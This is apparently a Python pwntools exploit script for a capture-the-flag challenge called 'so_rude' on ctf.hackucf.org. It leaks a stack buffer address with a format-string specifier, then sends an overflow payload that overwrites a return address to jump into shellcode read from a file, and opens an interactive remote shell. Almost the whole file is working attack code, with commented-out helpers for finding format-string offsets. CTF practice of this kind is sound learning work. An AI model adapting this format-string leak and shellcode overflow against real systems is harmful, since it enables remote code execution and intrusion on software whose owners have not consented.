from pwn import *
exe = context.binary = ELF('so_rude')
#io1 = exe.process()
with open('compiled.txt', 'rb') as f:
	shellcode = f.read()
io1 = remote("ctf.hackucf.org", 9006)
'''def exec_fmt(payload): 
   io1 = exe.process()
   io1.recvuntil(b'name:', timeout=1)
   print(f"Sending payload: {payload}")
   io1.sendline(payload)
   response = io1.recvall(timeout=3)
   print(f"Received response: {response}")
   return response'''
io1.sendline(b'%6$p')
io1.recvuntil(b'greetings, ')
bufaddr = int(io1.recvline().strip(), base=16)
# fit in to payload the address of the buffer and then jump to shellcode
payload = fit({
	62: bufaddr,
	138: shellcode
})
io1.recvuntil(b'password :')
io1.sendline(payload)
io1.interactive()
#fmt = FmtStr(execute_fmt=exec_fmt)
#offset = fmt.offset
#print(offset)

